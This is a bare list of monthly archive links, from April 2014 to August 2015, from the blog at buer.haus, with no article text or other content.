* [August 2015](https://buer.haus/2015/08/)
* [February 2015](https://buer.haus/2015/02/)
* [January 2015](https://buer.haus/2015/01/)
* [October 2014](https://buer.haus/2014/10/)
* [August 2014](https://buer.haus/2014/08/)
* [July 2014](https://buer.haus/2014/07/)
* [June 2014](https://buer.haus/2014/06/)
* [April 2014](https://buer.haus/2014/04/)


